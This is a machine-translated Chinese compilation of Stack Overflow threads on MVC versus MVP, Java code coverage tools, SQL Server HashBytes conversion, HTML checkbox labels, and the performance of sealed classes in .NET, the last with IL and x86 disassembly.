**例如：**当用户单击“Save”按钮时，View 中的事件处理程序将委托给 Presenter 的“OnSave”方法。Presenter 将执行所需的逻辑并与模型进行任何所需的通信，然后通过其接口回调视图，以便视图可以显示保存已完成。

# MVC 与 MVP

*   MVC 不让 View 负责，View 充当 Controller 可以管理和指导的从属设备。
*   在 MVC 中，视图是无状态的，而 MVP 中的视图是有状态的并且可以随时间变化。
*   在 MVP 中，视图没有逻辑，我们应该尽可能让它们保持沉默。另一方面，MVC 中的视图可能具有某种逻辑。
*   在 MVP 中，Presenter 与 View 分离，并通过接口与其对话。这允许在单元测试中模拟视图。
*   在 MVP 中，视图与模型完全隔离。但是，在 MVC 中，视图可以与模型通信，以使其与最新数据保持同步。

[![在此处输入图像描述](../Images/6a9e588abdabefff539182edf4d7fb9d.png)](https://i.stack.imgur.com/Yttsn.png)

* * *

## 回答 #23

> 赞同：2
> 
> 时间：2019-09-09T19:31:50.727

简单来说，

*   在 MVC 中，View 具有 UI 部分，它调用控制器，控制器又调用模型和模型，然后将事件返回给视图。
*   在 MVP 中，View 包含 UI 并为实现部分调用 Presenter。演示者直接调用视图以更新 UI 部分。包含业务逻辑的模型由演示者调用，并且与视图没有任何交互。所以这里的主持人做了大部分的工作:)

* * *

## 回答 #24

> 赞同：-1
> 
> 时间：2016-01-12T04:50:54.203

**MVP**

MVP 代表模型 - 视图 - 演示者。这出现在 2007 年初，微软推出了 Smart Client Windows 应用程序。

演示者在 MVP 中充当监督角色，将视图事件和模型中的业务逻辑绑定在一起。

视图事件绑定将在 Presenter 中从视图界面实现。

视图是用户输入的发起者，然后将事件委托给 Presenter，Presenter 处理事件绑定并从模型中获取数据。

**优点：** 视图只有 UI 没有任何逻辑 高水平的可测试性

**缺点：** 实现事件绑定时有点复杂且工作量更大

**MVC**

MVC 代表模型-视图-控制器。Controller 负责创建模型并使用绑定模型渲染视图。

控制器是发起者，它决定渲染哪个视图。

**优点：** 强调单一职责原则 高水平的可测试性

**缺点：** 如果尝试在同一个控制器中渲染多个视图，有时控制器的工作量太大。*

# java - 如何开始编写代码覆盖工具？

> ID：2092
> 
> 赞同：30
> 
> 时间：2008-08-05T11:15:16.953
> 
> 标签：java, testing, coldfusion, code-coverage

寻找真正讨论*如何*用 Java 编写代码覆盖工具的书籍或其他参考资料；一些不同的技术或技巧 - 源代码与字节码检测。

这是一种在底层生成 Java 字节码的脚本语言。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-08-10T07:19:47.650

您的脚本语言会生成字节码吗？它会生成调试元数据吗？如果是这样，字节码检测可能是要走的路。事实上，现有的工具可能会起作用（也许只需要很少的修改）。

此类工具的典型问题是它们被编写为与 Java 一起使用并假设 a`class com.foo.Bar.class`对应于一个文件`com/foo/Bar.java`。解开这个假设可能很乏味。

[EMMA](http://emma.sourceforge.net/)是一个 ClassLoader，它为 Java 中的代码覆盖集合进行字节码重写。编码风格有点时髦，但我建议阅读源代码以获得一些想法。

如果您的脚本语言被解释，那么您将需要一个更高级别的类加载器（在源代码级别），它可以连接到解释器中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-08-05T12:50:59.020

谢谢，麦克！[http://asm.objectweb.org/](http://asm.objectweb.org)是另一个。*关于字节码检测的优秀*文档，但没有“直接”旨在编写覆盖工具 - 只是一些提示或想法。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-12T17:58:25.630

您还可以从开源代码覆盖工具中获取源代码并从中学习。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-11-05T23:48:36.733

如果您在谈论 ColdFusion（我假设您来自标签），那么我不确定这是否可行，但我在这里可能非常错误......

IIRC，当 CF 编译时，它基本上编译成 CFML 的解释形式作为普通的旧 java 源文件，然后编译到类中。因此，您可能拥有的任何工具都将应用于中间版本而不是 CFML 本身。

话虽如此，Adobe 现在已经有了可以单步执行代码的 CF 调试器，所以请证明我错了——我喜欢 CFML 中的代码覆盖率。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-09-15T18:36:15.197

您可能还想使用 BCEL 之类的东西来分析字节码中实际存在的源代码行。您不想报告诸如空行和注释之类的内容尚未涵盖。

# sql - 将 HashBytes 转换为 VarChar

> ID：2120
> 
> 赞同：136
> 
> 时间：2008-08-05T11:49:11.360
> 
> 标签：sql, sql-server

* * *

## 回答 #1

> 赞同：156
> 
> 时间：2008-08-05T14:26:41.870

I have found the solution else where:

```
SELECT SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('MD5', 'HelloWorld')), 3, 32) 
```

* * *

## 回答 #2

> 赞同：99
> 
> 时间：2011-01-03T14:26:45.417

```
SELECT CONVERT(NVARCHAR(32),HashBytes('MD5', 'Hello World'),2) 
```

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2011-03-17T16:00:17.757

Use `master.dbo.fn_varbintohexsubstring(0, HashBytes('SHA1', @input), 1, 0)` instead of `master.dbo.fn_varbintohexstr` and then `substringing` the result.

In fact `fn_varbintohexstr` calls `fn_varbintohexsubstring` internally. The first argument of `fn_varbintohexsubstring` tells it to add `0xF` as the prefix or not. `fn_varbintohexstr` calls `fn_varbintohexsubstring` with `1` as the first argument internaly.

Because you don't need `0xF`, call `fn_varbintohexsubstring` directly.

* * *

## 回答 #4

> 赞同：29
> 
> 时间：2014-08-28T05:35:59.387

Contrary to what [David Knight](https://stackoverflow.com/users/161332/david-knight) says, these two alternatives return the same response in MS SQL 2008:

```
SELECT CONVERT(VARCHAR(32),HashBytes('MD5', 'Hello World'),2)
SELECT UPPER(master.dbo.fn_varbintohexsubstring(0, HashBytes('MD5', 'Hello World'), 1, 0)) 
```

So it looks like the first one is a better choice, starting from version 2008.

* * *

## 回答 #5

> 赞同：16
> 
> 时间：2011-09-07T07:43:45.407

```
convert(varchar(34), HASHBYTES('MD5','Hello World'),1) 
```

(1 for converting hexadecimal to string)

convert this to lower and remove 0x from the start of the string by substring:

```
substring(lower(convert(varchar(34), HASHBYTES('MD5','Hello World'),1)),3,32) 
```

exactly the same as what we get in C# after converting bytes to string

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-02-24T22:54:19.203

With personal experience of using the following code within a Stored Procedure which Hashed a SP Variable I can confirm, although undocumented, this combination works 100% as per my example:

```
@var=SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('SHA2_512', @SPvar)), 3, 128) 
```

* * *

## 回答 #7

> 赞同：-3
> 
> 时间：2010-02-17T21:31:15.543

Changing the datatype to varbinary seems to work the best for me.

# html - 如何通过单击文本标签来切换复选框？

> ID：2123
> 
> 赞同：43
> 
> 时间：2008-08-05T11:51:16.507
> 
> 标签：html, checkbox

`Checkboxes`在`HTML`表单中没有隐式*标签*。在其旁边添加显式标签（一些文本）不会切换`checkbox`.

**如何通过单击文本标签来切换复选框？**

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2008-08-05T12:00:03.367

如果您正确标记了 HTML 代码，则不需要 javascript。以下代码将允许用户单击标签文本以勾选复选框。

```
<label for="surname">Surname</label>
<input type="checkbox" name="surname" id="surname" /> 
```

label 元素上的*for属性链接到 input 元素上的**id*属性，其余的由浏览器完成。

这一直在测试工作：

*   IE6
*   IE7
*   火狐

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2008-08-05T12:52:50.047

将标签的 CSS`display`属性设置为块元素并使用它而不是您的 div - 它保留标签的语义含义，同时允许您喜欢任何样式。

例如：

```
label {
  width: 100px;
  height: 100px;
  display: block;
  background-color: #e0e0ff;
}
```

```
<label for="test">
  A ticky box! <input type="checkbox" id="test" />
</label>
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-05T12:28:32.623

罗尼，

如果您想将标签文本和复选框包含在包装元素中，您可以执行以下操作：

```
<label for="surname">
    Surname
    <input type="checkbox" name="surname" id="surname" />
</label> 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-08-25T15:21:39.787

正如@Gatekiller 和其他人所指出的，正确的解决方案是 <label> 标签。

点击文本很好，但使用 <label> 标签还有另一个原因：可访问性。视障人士用来访问网络的工具需要 <label> 来读出复选框和单选按钮的含义。如果没有 <label>，他们必须根据周围的文本进行猜测，而且他们经常会弄错或不得不放弃。

面对一个显示*“请选择您的运输方式，radio-button1，radio-button2，radio-button3”的表格是非常令人沮丧的。*

请注意，网络可访问性是一个复杂的主题；<label> 是必要的步骤，但它们不足以保证可访问性或遵守适用的政府法规。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-08-05T12:25:16.607

您可以将复选框包装在标签中：

```
<label style="display: block; padding: 50px 0 0 50px; background-color: pink; width: 80px; height: 80px">
  <input type="checkbox" name="surname">
</label> 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-09-01T12:10:03.947

您只需像这样将复选框包装在标签标签中

```
 <label style="height: 10px; width: 150px; display: block; ">
  [Checkbox Label Here] <input type="checkbox"/>
 </label> 
```

[小提琴](http://jsfiddle.net/w0zb4df3/)

或者您也可以使用标签的**for**属性和复选框的**id ，如下所示**

```
<label for="other">Other Details</label>
<input type="checkbox" id="other" /> 
```

[小提琴](http://jsfiddle.net/Lffnf7su/)

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2015-03-09T12:13:34.150

这应该工作：

```
<script>
function checkbox () {
    var check = document.getElementById("myCheck").checked;
    var box = document.getElementById("myCheck")

    if (check == true) {
        box.checked = false;
    }
    else if (check == false) {
        box.checked = true;
    }
}
</script>
<input type="checkbox"><p id="myCheck" onClick="checkbox();">checkbox</p> 
```

如果没有，请纠正我！

* * *

## 回答 #8

> 赞同：-2
> 
> 时间：2008-08-05T12:34:27.947

用标签包裹仍然不允许单击“框中的任何位置” - 仍然只是在文本上！这对我有用：

```
<div onclick="dob.checked=!dob.checked" class="checkbox"><input onclick="checked=!checked" id="dob" type="checkbox"/>Date of birth entry must be completed</div> 
```

但不幸的是，有很多 javascript 可以有效地切换两次。

# .net - 密封类真的能提供性能优势吗？

> ID：2134
> 
> 赞同：153
> 
> 时间：2008-08-05T12:00:28.733
> 
> 标签：.net, optimization, frameworks, performance

我遇到了很多优化技巧，它们说你应该将你的类标记为密封以获得额外的性能优势。

我进行了一些测试以检查性能差异，但没有发现。难道我做错了什么？我是否错过了密封类会产生更好结果的情况？

有没有人运行测试并看到了不同？

帮我学习:)

* * *

## 回答 #1

> 赞同：153
> 
> 时间：2008-12-24T02:09:26.440

答案是否定的，密封类的性能并不比非密封类好。

2021 年：现在的答案是肯定的，密封课程有性能优势。

密封一个类可能并不总能提高性能，但 dotnet 团队正在采用密封所有内部类的规则，以便为优化器提供最佳机会。

有关详细信息，您可以阅读[https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-6/#peanut-butter](https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-6/#peanut-butter)

下面的旧答案。

问题归结为`call`vs `callvirt`IL 操作码。`Call`比 快`callvirt`，`callvirt`主要用于不知道对象是否被子类化的情况。所以人们假设如果你密封一个类，所有的操作码都会从`calvirts`变为`calls`并且会更快。

不幸的是`callvirt`，它还有其他有用的东西，比如检查空引用。这意味着即使一个类是密封的，引用可能仍然为空，因此`callvirt`需要 a。您可以解决这个问题（无需密封课程），但这变得有点毫无意义。

使用结构`call`是因为它们不能被子类化并且永远不会为空。

有关更多信息，请参阅此问题：

[调用和调用virt](https://stackoverflow.com/questions/193939/call-and-callvirt)

* * *

## 回答 #2

> 赞同：63
> 
> 时间：2008-08-05T12:32:40.510

JITter 有时会对密封类中的方法使用非虚拟调用，因为它们无法进一步扩展。

关于调用类型、虚拟/非虚拟有复杂的规则，我并不了解它们，所以我无法为您真正概述它们，但如果您在谷歌上搜索密封类和虚拟方法，您可能会找到一些关于该主题的文章。

请注意，您将从这一优化级别获得的任何性能优势都应被视为最后的手段，始终在算法级别进行优化，然后再进行代码级别的优化。

这是一个提到这一点的链接：[Rambling on the seal关键字](http://codebetter.com/blogs/patricksmacchia/archive/2008/01/05/rambling-on-the-sealed-keyword.aspx)

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2012-02-20T20:45:28.267

更新：从 .NET Core 2.0 和 .NET Desktop 4.7.1 开始，CLR 现在支持去虚拟化。它可以采用密封类中的方法并用直接调用替换虚拟调用——如果它可以确定这样做是安全的，它也可以对非密封类执行此操作。

在这种情况下（CLR 无法检测到可以安全地去虚拟化的密封类），密封类实际上应该提供某种性能优势。

*也就是说，除非*您已经对代码进行了概要分析并确定您处于被调用数百万次的特别热门路径或类似的东西，否则我认为这不值得担心：

[https://blogs.msdn.microsoft.com/dotnet/2017/06/29/performance-improvements-in-ryujit-in-net-core-and-net-framework/](https://blogs.msdn.microsoft.com/dotnet/2017/06/29/performance-improvements-in-ryujit-in-net-core-and-net-framework/)

* * *

原答案：

我制作了以下测试程序，然后使用 Reflector 对其进行反编译以查看发出了哪些 MSIL 代码。

```
public class NormalClass {
    public void WriteIt(string x) {
        Console.WriteLine("NormalClass");
        Console.WriteLine(x);
    }
}

public sealed class SealedClass {
    public void WriteIt(string x) {
        Console.WriteLine("SealedClass");
        Console.WriteLine(x);
    }
}

public static void CallNormal() {
    var n = new NormalClass();
    n.WriteIt("a string");
}

public static void CallSealed() {
    var n = new SealedClass();
    n.WriteIt("a string");
} 
```

在所有情况下，C# 编译器（发布构建配置中的 Visual Studio 2010）都会发出相同的 MSIL，如下所示：

```
L_0000: newobj instance void <NormalClass or SealedClass>::.ctor()
L_0005: stloc.0 
L_0006: ldloc.0 
L_0007: ldstr "a string"
L_000c: callvirt instance void <NormalClass or SealedClass>::WriteIt(string)
L_0011: ret 
```

人们说密封提供性能优势的经常被引用的原因是编译器知道该类没有被覆盖，因此可以使用`call`而不是`callvirt`因为它不必检查虚拟等。如上所述，这不是真的。

我的下一个想法是，即使 MSIL 是相同的，也许 JIT 编译器对密封类的处理方式不同？

我在 Visual Studio 调试器下运行了一个发布版本，并查看了反编译的 x86 输出。在这两种情况下，x86 代码都是相同的，除了类名和函数内存地址（当然它们必须不同）。这里是

```
//            var n = new NormalClass();
00000000  push        ebp 
00000001  mov         ebp,esp 
00000003  sub         esp,8 
00000006  cmp         dword ptr ds:[00585314h],0 
0000000d  je          00000014 
0000000f  call        70032C33 
00000014  xor         edx,edx 
00000016  mov         dword ptr [ebp-4],edx 
00000019  mov         ecx,588230h 
0000001e  call        FFEEEBC0 
00000023  mov         dword ptr [ebp-8],eax 
00000026  mov         ecx,dword ptr [ebp-8] 
00000029  call        dword ptr ds:[00588260h] 
0000002f  mov         eax,dword ptr [ebp-8] 
00000032  mov         dword ptr [ebp-4],eax 
//            n.WriteIt("a string");
00000035  mov         edx,dword ptr ds:[033220DCh] 
0000003b  mov         ecx,dword ptr [ebp-4] 
0000003e  cmp         dword ptr [ecx],ecx 
00000040  call        dword ptr ds:[0058827Ch] 
//        }
00000046  nop 
00000047  mov         esp,ebp 
00000049  pop         ebp 
0000004a  ret 
```

然后我想也许在调试器下运行会导致它执行不那么激进的优化？

然后，我在任何调试环境之外运行了一个独立的发布构建可执行文件，并在程序完成后使用 WinDBG + SOS 闯入，并查看 JIT 编译的 x86 代码的反汇编。

从下面的代码中可以看出，当在调试器之外运行时，JIT 编译器更加激进，它`WriteIt`直接将方法内联到调用者中。然而，关键是在调用密封类和非密封类时它是相同的。密封类和非密封类之间没有任何区别。

这是调用普通类时：

```
Normal JIT generated code
Begin 003c00b0, size 39
003c00b0 55              push    ebp
003c00b1 8bec            mov     ebp,esp
003c00b3 b994391800      mov     ecx,183994h (MT: ScratchConsoleApplicationFX4.NormalClass)
003c00b8 e8631fdbff      call    00172020 (JitHelp: CORINFO_HELP_NEWSFAST)
003c00bd e80e70106f      call    mscorlib_ni+0x2570d0 (6f4c70d0) (System.Console.get_Out(), mdToken: 060008fd)
003c00c2 8bc8            mov     ecx,eax
003c00c4 8b1530203003    mov     edx,dword ptr ds:[3302030h] ("NormalClass")
003c00ca 8b01            mov     eax,dword ptr [ecx]
003c00cc 8b403c          mov     eax,dword ptr [eax+3Ch]
003c00cf ff5010          call    dword ptr [eax+10h]
003c00d2 e8f96f106f      call    mscorlib_ni+0x2570d0 (6f4c70d0) (System.Console.get_Out(), mdToken: 060008fd)
003c00d7 8bc8            mov     ecx,eax
003c00d9 8b1534203003    mov     edx,dword ptr ds:[3302034h] ("a string")
003c00df 8b01            mov     eax,dword ptr [ecx]
003c00e1 8b403c          mov     eax,dword ptr [eax+3Ch]
003c00e4 ff5010          call    dword ptr [eax+10h]
003c00e7 5d              pop     ebp
003c00e8 c3              ret 
```

与密封类相比：

```
Normal JIT generated code
Begin 003c0100, size 39
003c0100 55              push    ebp
003c0101 8bec            mov     ebp,esp
003c0103 b90c3a1800      mov     ecx,183A0Ch (MT: ScratchConsoleApplicationFX4.SealedClass)
003c0108 e8131fdbff      call    00172020 (JitHelp: CORINFO_HELP_NEWSFAST)
003c010d e8be6f106f      call    mscorlib_ni+0x2570d0 (6f4c70d0) (System.Console.get_Out(), mdToken: 060008fd)
003c0112 8bc8            mov     ecx,eax
003c0114 8b1538203003    mov     edx,dword ptr ds:[3302038h] ("SealedClass")
003c011a 8b01            mov     eax,dword ptr [ecx]
003c011c 8b403c          mov     eax,dword ptr [eax+3Ch]
003c011f ff5010          call    dword ptr [eax+10h]
003c0122 e8a96f106f      call    mscorlib_ni+0x2570d0 (6f4c70d0) (System.Console.get_Out(), mdToken: 060008fd)
003c0127 8bc8            mov     ecx,eax
003c0129 8b1534203003    mov     edx,dword ptr ds:[3302034h] ("a string")
003c012f 8b01            mov     eax,dword ptr [ecx]
003c0131 8b403c          mov     eax,dword ptr [eax+3Ch]
003c0134 ff5010          call    dword ptr [eax+10h]
003c0137 5d              pop     ebp
003c0138 c3              ret 
```

对我来说，这提供了坚实的证据，证明在密封类和非密封类上调用方法之间*没有任何性能改进......我想我现在很高兴:-)*

* * *

## 回答 #4

> 赞同：24
> 
> 时间：2011-02-03T15:22:32.063

据我所知，不能保证性能优势。但是在某些特定条件下使用密​​封方法**有可能降低性能损失。**（密封类使所有方法都被密封。）

但这取决于编译器的实现和执行环境。

* * *

# 细节

许多现代 CPU 使用长流水线结构来提高性能。因为 CPU 比内存快得令人难以置信，所以 CPU 必须从内存中预取代码来加速流水线。如果代码没有在适当的时间准备好，管道将处于空闲状态。

有一个很大的障碍叫做**[动态调度](http://en.wikipedia.org/wiki/Dynamic_dispatch)**，它破坏了这种“预取”优化。您可以将其理解为仅是条件分支。

```
// Value of `v` is unknown,
// and can be resolved only at runtime.
// CPU cannot know which code to prefetch.
// Therefore, just prefetch any one of a() or b().
// This is *speculative execution*.
int v = random();
if (v==1) a();
else b(); 
```

在这种情况下，CPU 无法预取下一个要执行的代码，因为在条件解决之前，下一个代码位置是未知的。所以这使得[危险](http://en.wikipedia.org/wiki/Hazard_(computer_architecture))导致管道空闲。空闲时的性能损失在正常情况下是巨大的。

在方法覆盖的情况下会发生类似的事情。编译器可能会确定当前方法调用的正确方法覆盖，但有时这是不可能的。在这种情况下，只有在运行时才能确定正确的方法。这也是动态调度的一种情况，并且动态类型语言通常比静态类型语言慢的主要原因。

一些 CPU（包括最近的 Intel 的 x86 芯片）甚至在这种情况下使用称为**[推测执行的技术来利用管道。](http://en.wikipedia.org/wiki/Speculative_execution#Processors)**只需预取其中一个执行路径。但是这种技术的命中率并没有那么高。推测失败会导致管道停顿，这也会造成巨大的性能损失。（这完全是由 CPU 实现的。有些移动 CPU 号称没有这种优化以节省能源）

基本上，C# 是一种静态编译语言。但不总是。我不知道确切的条件，这完全取决于编译器的实现。如果方法被标记为 ，一些编译器可以通过防止方法覆盖来消除动态分派的可能性`sealed`。愚蠢的编译器可能不会。这是`sealed`.

* * *

这个答案（[Why is it faster to process a sorted array than an unsorted array?](https://stackoverflow.com/questions/11227809/why-is-processing-a-sorted-array-faster-than-an-unsorted-array/11227902#11227902)）更好地描述了分支预测。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-10-14T20:04:19.703

<题外话>

我*讨厌*密封的课程。即使性能优势令人震惊（我对此表示怀疑），它们也会通过阻止通过继承重用来*破坏*面向对象的模型。例如，Thread 类是密封的。虽然我可以看到人们可能希望线程尽可能高效，但我也可以想象能够将 Thread 子类化的场景会带来很大的好处。类作者，如果您出于“性能”原因*必须密封您的类，***请至少提供一个接口**，这样我们就不必在需要您忘记的功能的任何地方进行包装和替换。

示例：[SafeThread](http://www.codeproject.com/KB/threads/SafeThread.aspx)必须封装 Thread 类，因为 Thread 是密封的并且没有 IThread 接口；SafeThread 自动捕获线程上未处理的异常，这是 Thread 类中完全缺失的。[不，未处理的异常事件*不会*在辅助线程中获取未处理的异常]。

</off-topic-rant>

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-11-20T09:53:29.783

标记一个类`sealed`不应该对性能产生影响。

在某些情况下，`csc`可能必须发出`callvirt`操作码而不是`call`操作码。但是，这些情况似乎很少见。

在我看来，如果 JIT知道该类没有任何子类（还）`callvirt`，它应该能够发出与它相同的非虚拟函数调用。`call`如果该方法只存在一个实现，那么从 vtable 加载它的地址是没有意义的——直接调用一个实现即可。就此而言，JIT 甚至可以内联该函数。

这对 JIT 来说是一场赌博，因为如果稍后加载子类*，* JIT 将不得不丢弃该机器代码并再次编译代码，发出真正的虚拟调用。我的猜测是这在实践中并不经常发生。

（是的，VM 设计者确实在积极地追求这些微小的性能优势。）

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-08-05T12:37:07.067

密封类*应该*提供性能改进。由于无法派生密封类，因此任何虚拟成员都可以变成非虚拟成员。

当然，我们说的是非常小的收益。我不会仅仅为了提高性能而将一个类标记为密封类，除非分析表明它是一个问题。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2010-08-03T14:27:15.043

我认为“密封”类是正常情况，我总是有理由省略“密封”关键字。

对我来说最重要的原因是：

a) 更好的编译时检查（将在编译时检测到未实现的接口，而不仅仅是在运行时）

最重要的原因：

b) 这样就不可能滥用我的课程

我希望微软将“密封”作为标准，而不是“未密封”。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2011-10-01T10:37:28.847

密封类至少会快一点，但有时可能会快得多……如果 JIT 优化器可以内联本来是虚拟调用的调用。因此，如果经常调用的方法足够小可以内联，那么一定要考虑密封类。

然而，封闭一个类的最好理由是说“我没有设计它来继承，所以我不会让你因为假设它是这样设计的而被烧毁，我不会去因为我让你从中获得灵感，所以被锁定在一个实现中来燃烧自己。”

我知道这里有些人说他们讨厌密封类，因为他们希望有机会从任何东西中派生出来……但这通常不是最易于维护的选择……因为将类暴露给派生比不暴露所有内容更能锁定你那。这类似于说“我讨厌有私人成员的课程......我经常无法让课程做我想做的事，因为我没有访问权限。” 封装很重要……密封是封装的一种形式。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-02-25T15:00:22.427

要真正看到它们，您需要分析**JIT 编译**的代码e（最后一个）。

**C# 代码**

```
public sealed class Sealed
{
    public string Message { get; set; }
    public void DoStuff() { }
}
public class Derived : Base
{
    public sealed override void DoStuff() { }
}
public class Base
{
    public string Message { get; set; }
    public virtual void DoStuff() { }
}
static void Main()
{
    Sealed sealedClass = new Sealed();
    sealedClass.DoStuff();
    Derived derivedClass = new Derived();
    derivedClass.DoStuff();
    Base BaseClass = new Base();
    BaseClass.DoStuff();
} 
```

**军用代码**

```
.method private hidebysig static void  Main() cil managed
{
  .entrypoint
  // Code size       41 (0x29)
  .maxstack  8
  IL_0000:  newobj     instance void ConsoleApp1.Program/Sealed::.ctor()
  IL_0005:  callvirt   instance void ConsoleApp1.Program/Sealed::DoStuff()
  IL_000a:  newobj     instance void ConsoleApp1.Program/Derived::.ctor()
  IL_000f:  callvirt   instance void ConsoleApp1.Program/Base::DoStuff()
  IL_0014:  newobj     instance void ConsoleApp1.Program/Base::.ctor()
  IL_0019:  callvirt   instance void ConsoleApp1.Program/Base::DoStuff()
  IL_0028:  ret
} // end of method Program::Main 
```

**JIT 编译代码**

```
--- C:\Users\Ivan Porta\source\repos\ConsoleApp1\Program.cs --------------------
        {
0066084A  in          al,dx  
0066084B  push        edi  
0066084C  push        esi  
0066084D  push        ebx  
0066084E  sub         esp,4Ch  
00660851  lea         edi,[ebp-58h]  
00660854  mov         ecx,13h  
00660859  xor         eax,eax  
0066085B  rep stos    dword ptr es:[edi]  
0066085D  cmp         dword ptr ds:[5842F0h],0  
00660864  je          0066086B  
00660866  call        744CFAD0  
0066086B  xor         edx,edx  
0066086D  mov         dword ptr [ebp-3Ch],edx  
00660870  xor         edx,edx  
00660872  mov         dword ptr [ebp-48h],edx  
00660875  xor         edx,edx  
00660877  mov         dword ptr [ebp-44h],edx  
0066087A  xor         edx,edx  
0066087C  mov         dword ptr [ebp-40h],edx  
0066087F  nop  
            Sealed sealedClass = new Sealed();
00660880  mov         ecx,584E1Ch  
00660885  call        005730F4  
0066088A  mov         dword ptr [ebp-4Ch],eax  
0066088D  mov         ecx,dword ptr [ebp-4Ch]  
00660890  call        00660468  
00660895  mov         eax,dword ptr [ebp-4Ch]  
00660898  mov         dword ptr [ebp-3Ch],eax  
            sealedClass.DoStuff();
0066089B  mov         ecx,dword ptr [ebp-3Ch]  
0066089E  cmp         dword ptr [ecx],ecx  
006608A0  call        00660460  
006608A5  nop  
            Derived derivedClass = new Derived();
006608A6  mov         ecx,584F3Ch  
006608AB  call        005730F4  
006608B0  mov         dword ptr [ebp-50h],eax  
006608B3  mov         ecx,dword ptr [ebp-50h]  
006608B6  call        006604A8  
006608BB  mov         eax,dword ptr [ebp-50h]  
006608BE  mov         dword ptr [ebp-40h],eax  
            derivedClass.DoStuff();
006608C1  mov         ecx,dword ptr [ebp-40h]  
006608C4  mov         eax,dword ptr [ecx]  
006608C6  mov         eax,dword ptr [eax+28h]  
006608C9  call        dword ptr [eax+10h]  
006608CC  nop  
            Base BaseClass = new Base();
006608CD  mov         ecx,584EC0h  
006608D2  call        005730F4  
006608D7  mov         dword ptr [ebp-54h],eax  
006608DA  mov         ecx,dword ptr [ebp-54h]  
006608DD  call        00660490  
006608E2  mov         eax,dword ptr [ebp-54h]  
006608E5  mov         dword ptr [ebp-44h],eax  
            BaseClass.DoStuff();
006608E8  mov         ecx,dword ptr [ebp-44h]  
006608EB  mov         eax,dword ptr [ecx]  
006608ED  mov         eax,dword ptr [eax+28h]  
006608F0  call        dword ptr [eax+10h]  
006608F3  nop  
        }
0066091A  nop  
0066091B  lea         esp,[ebp-0Ch]  
0066091E  pop         ebx  
0066091F  pop         esi  
00660920  pop         edi  
00660921  pop         ebp  

00660922  ret 
```

虽然对象的创建是相同的，但调用密封类和派生类/基类的方法所执行的指令略有不同。将数据移入寄存器或RAM（mov指令）后，调用密封方法，执行dword ptr [ecx]，ecx（cmp指令）之间的比较，然后调用该方法，而派生/基类直接执行该方法。 .

根据 Torbj¨orn Granlund 撰写的报告，**AMD 和 Intel x86 处理器的指令延迟和吞吐量，** Intel Pentium 4 中以下指令的速度为：

*   **mov**：有 1 个周期作为延迟，处理器每个周期可以支持 2.5 条这种类型的指令
*   **cmp**：有 1 个周期作为延迟，处理器可以在这种类型的每个周期中维持 2 条指令

**链接**：[https ://gmplib.org/~tege/x86-timing.pdf](https://gmplib.org/~tege/x86-timing.pdf)

这意味着，**理想情况下**，调用密封方法所需的时间是 2 个周期，而调用派生类或基类方法所需的时间是 3 个周期。

编译器的优化使得密封类和非密封类的性能差异如此之低，以至于我们正在谈论处理器圈，因此与大多数应用程序无关。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2021-11-22T11:38:46.357

[从 .NET 6.0 开始，答案是肯定的。](https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-6/#peanut-butter)

密封类可以帮助 JIT 去虚拟化调用，从而减少调用方法时的开销。这有额外的好处，因为必要时 JIT 可以内联去虚拟化的调用，这也可能导致不断折叠。

例如，在 MSDN 文章的这段代码中：

```
[Benchmark(Baseline = true)]
public int NonSealed() => _nonSealed.M() + 42;

[Benchmark]
public int Sealed() => _sealed.M() + 42;

public class BaseType
{
    public virtual int M() => 1;
}

public class NonSealedType : BaseType
{
    public override int M() => 2;
}

public sealed class SealedType : BaseType
{
    public override int M() => 2;
} 
```

“NonSealed”基准运行时间为 0.9837ns，但“Sealed”方法并不比仅返回一个常量值的函数花费更多时间。这是由于不断折叠。

类型检查密封类也具有性能优势，例如 MSDN 文章中的这段代码：

```
private object _o = "hello";

[Benchmark(Baseline = true)]
public bool NonSealed() => _o is NonSealedType;

[Benchmark]
public bool Sealed() => _o is SealedType;

public class NonSealedType { }
public sealed class SealedType { } 
```

检查非密封类型大约需要 1.76ns，而检查密封类型只需大约 0.07ns。

事实上，.NET 团队制定了一个策略来密封所有可以密封的私有和内部类。

请注意，我们正在处理节省不到 2 纳秒的调用，因此调用虚拟方法的开销在大多数情况下不会成为瓶颈。我认为它更适合简单的虚拟吸气剂或非常短的方法。

* * *

## 回答 #12

> 赞同：-11
> 
> 时间：2009-11-26T17:50:14.860

运行这段代码，你会发现密封类的速度提高了 2 倍：

```
class Program
{
    static void Main(string[] args)
    {
        Console.ReadLine();

        var watch = new Stopwatch();
        watch.Start();
        for (int i = 0; i < 10000000; i++)
        {
            new SealedClass().GetName();
        }
        watch.Stop();
        Console.WriteLine("Sealed class : {0}", watch.Elapsed.ToString());

        watch.Start();
        for (int i = 0; i < 10000000; i++)
        {
            new NonSealedClass().GetName();
        }
        watch.Stop();
        Console.WriteLine("NonSealed class : {0}", watch.Elapsed.ToString());

        Console.ReadKey();
    }
}

sealed class SealedClass
{
    public string GetName()
    {
        return "SealedClass";
    }
}

class NonSealedClass
{
    public string GetName()
    {
        return "NonSealedClass";
    }
} 
```

输出：密封类：00:00:00.1897568 非密封类：00:00:00.3826678

# .net - .NET 2.0 运行时上的 LINQ

> ID：2138
